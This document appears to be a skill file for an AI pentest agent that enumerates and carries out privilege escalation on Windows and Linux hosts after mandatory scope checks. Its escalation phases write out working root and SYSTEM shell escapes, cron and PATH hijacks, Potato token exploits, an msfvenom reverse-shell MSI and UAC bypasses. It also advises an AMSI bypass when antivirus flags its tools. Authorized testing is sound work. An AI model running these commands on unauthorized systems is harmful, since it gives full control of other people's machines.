---
name: privesc
description: Privilege escalation orchestrator for both Windows and Linux. Auto-detects OS, enumerates escalation vectors, executes authorized escalation paths, and hands off to post-exploit for follow-on actions.
invocation: /privesc <target-host> [--os <windows|linux>] [--user <user:password>] [--shell <shell-type>] [--scope <scope-file>] [--output <dir>]
---

# Privilege Escalation Orchestrator

## Overview

Systematic privilege escalation following confirmed initial access. Auto-detects Windows vs Linux. Enumerates all vectors, ranks by exploitability, attempts authorized escalation, and feeds results to post-exploit.

## Phases

```
Scope → OS Detection → Enum → Escalation → Post-Escalation → Report
```

## Inputs

| Param | Required | Description |
|-------|----------|-------------|
| `target-host` | yes | Target hostname or IP |
| `--os` | no | Force OS: `windows` or `linux` (auto-detect if omitted) |
| `--user` | no | Current user context (for context-aware enum) |
| `--shell` | no | Shell type: `bash`, `sh`, `cmd`, `powershell`, `meterpreter` |
| `--scope` | no | Scope file (authorized hosts, escalation limits) |
| `--output` | no | Output dir (default: `./privesc-output/`) |

## Output

- `privesc-findings.json` — escalation paths w/ severity + CVSS
- `escalation-proof.md` — documented proof of escalation achieved
- `evidence/` — per-phase evidence
- `report.md` — privilege escalation assessment report

---

## Phase 0: Scope Verification

**MANDATORY — cannot be skipped.**

```
SCOPE CHECK:
1. Parse target-host
2. If --scope file → load authorized hosts + escalation limits
3. If NO scope file → STOP. Confirm authorization with user:
   "Confirm in writing: you are authorized to attempt privilege escalation
    on host <target>. Specify the authorized target privilege level (local admin / SYSTEM / root)."
4. Confirm rules of engagement:
   - Is kernel exploitation authorized? (risk of system crash)
   - Is service manipulation authorized? (risk of disruption)
   - What is the maximum authorized privilege level?
5. Save evidence/00-scope/scope-definition.md
6. Assign agent: privesc-windows OR privesc-linux (or both if multi-OS scope)
```

**Failure**: No scope verification → HALT.

---

## Phase 1: OS Detection

```
DETECT OS:
  # Auto-detect from shell banner or explicit --os flag
  
  If Linux/Unix:
    uname -a
    cat /etc/os-release
    → Route to: privesc-linux agent

  If Windows:
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    → Route to: privesc-windows agent

  If unknown:
    → STOP. Request --os flag from operator.
```

---

## Phase 2: Enumeration

### Linux Path → `privesc-linux`

```
SPAWN privesc-linux agent:
  task: "Linux privilege escalation enumeration on $TARGET"
  constraints:
    - Scope: $SCOPE
    - Read-only enumeration in this phase
  
  Automated:
    linpeas.sh > evidence/02-enum/linpeas-output.txt
    linux-exploit-suggester.sh > evidence/02-enum/les-output.txt
  
  Manual checklist:
    # Identity
    id && groups && sudo -l
    
    # Kernel and OS version (for exploit search)
    uname -r && cat /etc/os-release
    
    # SUID/SGID binaries
    find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc | sort
    
    # Sudo misconfigs
    sudo -l                                    # Check (ALL) NOPASSWD entries
    sudo -V                                    # Check for sudo heap overflow versions
    
    # Capabilities
    /sbin/getcap -r / 2>/dev/null
    
    # Writable files in sensitive locations
    find /etc /bin /sbin /usr/bin /usr/sbin -writable 2>/dev/null
    find / -path /proc -prune -o -perm -0002 -type f -print 2>/dev/null | head -30
    
    # PATH hijacking
    echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'ls -ld {} 2>/dev/null | grep -v "root root"'
    
    # Cron jobs (look for writable scripts called by root cron)
    crontab -l; cat /etc/cron* 2>/dev/null; ls -la /etc/cron*
    cat /var/spool/cron/crontabs/root 2>/dev/null
    
    # Services running as root
    ps auxf | grep "^root"
    systemctl list-units --type=service --state=running
    
    # Docker / container escape
    ls -la /var/run/docker.sock 2>/dev/null
    id | grep docker
    cat /proc/1/cgroup | grep docker    # Am I in a container?
    
    # NFS mounts (no_root_squash?)
    showmount -e localhost 2>/dev/null
    cat /etc/exports 2>/dev/null
    
    # World-writable service configs
    find /etc/systemd /etc/init.d -writable 2>/dev/null
    
    # LD_PRELOAD / LD_LIBRARY_PATH abuse via sudo env keep
    env | grep LD_
  
  output:
    - evidence/02-enum/linux-enum-summary.json
    - evidence/02-enum/suid-binaries.txt
    - evidence/02-enum/sudo-config.txt
    - evidence/02-enum/capabilities.txt
    - evidence/02-enum/cron-analysis.md
```

### Windows Path → `privesc-windows`

```
SPAWN privesc-windows agent:
  task: "Windows privilege escalation enumeration on $TARGET"
  constraints:
    - Scope: $SCOPE
    - Read-only enumeration in this phase
  
  Automated:
    .\winPEAS.exe > evidence\02-enum\winpeas-output.txt
    .\PowerUp.ps1; Invoke-AllChecks > evidence\02-enum\powerup-output.txt
    .\SharpUp.exe audit > evidence\02-enum\sharpup-output.txt
    Seatbelt.exe -group=all > evidence\02-enum\seatbelt-output.txt
  
  Manual checklist (PowerShell):
    # Identity
    whoami /all                          # User, groups, privileges (SeImpersonatePrivilege!)
    net user $env:USERNAME
    net localgroup Administrators
    
    # OS / patch level
    systeminfo
    wmic qfe list brief | sort /R        # Installed patches (missing = exploitable?)
    
    # SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
    whoami /priv | findstr /i "impersonate\|assignprimary\|backup\|restore"
    # → JuicyPotato / PrintSpoofer / RoguePotato if present + Win < 2019
    
    # Unquoted service paths
    wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
    
    # Writable service binaries
    # (PowerUp: Invoke-AllChecks covers this)
    
    # AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    
    # Stored credentials
    cmdkey /list
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # AutoLogon creds
    
    # SAM / SYSTEM accessible?
    reg query HKLM\SAM 2>$null
    
    # DLL hijacking (check %PATH% for user-writable dirs)
    # Process Monitor or manual PATH check
    
    # Task Scheduler (writable tasks run by SYSTEM?)
    schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status"
    
    # Services with weak permissions
    sc qc <service>
    # PowerUp: Get-ModifiableServiceFile, Get-ModifiableService
    
    # UAC bypass potential
    # (check UAC level: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System)
  
  output:
    - evidence\02-enum\windows-enum-summary.json
    - evidence\02-enum\privileges.txt
    - evidence\02-enum\services-analysis.md
    - evidence\02-enum\registry-creds.md
    - evidence\02-enum\scheduled-tasks.md
```

---

## Phase 3: Escalation

### Linux Escalation → `privesc-linux`

```
SPAWN privesc-linux agent:
  task: "Execute privilege escalation on Linux host $TARGET"
  input: evidence/02-enum/linux-enum-summary.json
  constraints:
    - Scope: $SCOPE
    - Attempt in order of risk (least disruptive first)
    - STOP if system instability detected
  
  Priority order:
  
  1. SUDO misconfiguration (safest — no kernel risk)
     sudo -l → check for (ALL) NOPASSWD or (ALL) entries
     GTFOBins lookup for each allowed binary:
       sudo find . -exec /bin/sh \; -quit
       sudo vim -c ':!/bin/sh'
       sudo python3 -c 'import os; os.system("/bin/sh")'
  
  2. SUID binary abuse (GTFOBins)
     For each SUID binary → check https://gtfobins.github.io
     ./suid-binary --option "$(id)" ...  # document payload
  
  3. Capability abuse
     /usr/bin/python3 (cap_setuid+ep) → import os; os.setuid(0); os.system('/bin/sh')
     /usr/bin/vim (cap_dac_read_search) → read /etc/shadow
  
  4. Cron job path hijacking / script replacement
     Identify writable script called by root cron
     Create malicious script: echo "chmod +s /bin/bash" > /writable/path/script.sh
     Wait for cron execution, then: /bin/bash -p
     CLEAN UP: restore original script after proof captured
  
  5. Writable service / PATH hijack
     Create binary earlier in PATH: echo '#!/bin/sh\nchmod +s /bin/bash' > /writable-path/service-binary
     Restart service (if permitted) or wait
  
  6. Kernel exploit (highest risk — CONFIRM with operator first)
     linux-exploit-suggester.sh → identify candidates
     Research CVE, source/compile exploit
     WARNING: kernel exploits can panic the system — notify operator before attempt
  
  output:
    - evidence/03-escalation/linux-escalation-proof.md (id output showing root)
    - evidence/03-escalation/technique-used.md
    - evidence/03-escalation/escalation-summary.json
```

### Windows Escalation → `privesc-windows`

```
SPAWN privesc-windows agent:
  task: "Execute privilege escalation on Windows host $TARGET"
  input: evidence\02-enum\windows-enum-summary.json
  constraints:
    - Scope: $SCOPE
    - Attempt in order of risk (least disruptive first)
  
  Priority order:
  
  1. Token impersonation (if SeImpersonatePrivilege)
     # Windows Server 2019+ → SweetPotato / GodPotato
     .\SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
     # Windows < 2019 → JuicyPotato / PrintSpoofer
     .\PrintSpoofer.exe -i -c cmd
     .\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
  
  2. Unquoted service path
     sc stop <service>
     # Place malicious binary at unquoted path gap
     sc start <service>
     # CLEAN UP after proof captured
  
  3. AlwaysInstallElevated
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4444 -f msi > evil.msi
     msiexec /quiet /qn /i evil.msi
  
  4. AutoLogon credentials reuse
     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
     # Use retrieved credentials for lateral or local admin access
  
  5. Saved credentials (cmdkey)
     cmdkey /list → if admin creds stored:
     runas /savedcred /user:DOMAIN\Administrator cmd
  
  6. Service binary replacement (writable service exe)
     sc qc <service> → binary path writable?
     Replace binary, restart service
     CLEAN UP: restore binary after proof
  
  7. UAC bypass (if medium-integrity shell, UAC enabled)
     # fodhelper, eventvwr, computerdefaults — depends on Windows version
     # PowerUp: Invoke-AllChecks → UAC bypass candidates
  
  8. Kernel exploit (highest risk — CONFIRM with operator)
     systeminfo → search exploitdb / searchsploit
     WARNING: may BSOD — confirm before attempt
  
  output:
    - evidence\03-escalation\windows-escalation-proof.md (whoami /all showing SYSTEM/Admin)
    - evidence\03-escalation\technique-used.md
    - evidence\03-escalation\escalation-summary.json
```

---

## Phase 4: Post-Escalation

**Agent**: `post-exploit`

```
SPAWN post-exploit agent:
  task: "Post-exploitation following privilege escalation on $TARGET"
  input: evidence/03-escalation/ (proof of escalation)
  constraints:
    - Scope: $SCOPE
    - Operator must explicitly re-authorize post-exploitation
    - All post-exploit safety constraints apply
  output: evidence/04-post-exploit/
```

---

## Phase 5: Report

**Agent**: `report-writer`

```
SPAWN report-writer agent:
  task: "Generate privilege escalation assessment report for $TARGET"
  input: evidence/ (all phases)
  output:
    - report.md:
      - Executive Summary (what escalation means for business)
      - Escalation Path Diagram: initial-user → root/SYSTEM
      - Findings by Vector (sudo, SUID, services, tokens, kernel, etc.)
      - Compliance Impact
      - Remediation Priority Matrix
    - privesc-findings.json
    - escalation-proof.md
```

---

## Error Handling

| Scenario | Action |
|----------|--------|
| Kernel exploit causes instability | Document the vector; do NOT attempt exploitation; report as critical |
| Service restart disrupts app | Restore immediately; notify operator; document |
| Tool detection by AV | Try AMSI bypass or manual equivalent; note OPSEC limitations |
| Escalation not achieved | Document all enumerated vectors as findings; unachieved ≠ no findings |
| OS detection fails | STOP; request --os flag from operator |

## Completion

```
PRIVESC ASSESSMENT COMPLETE
Target: $TARGET
OS: $OS
Phases completed: $N/5
Highest privilege achieved: [user context]
Escalation technique: [technique]
Findings: X critical, Y high, Z medium, W low
Report: $OUTPUT_DIR/report.md
```
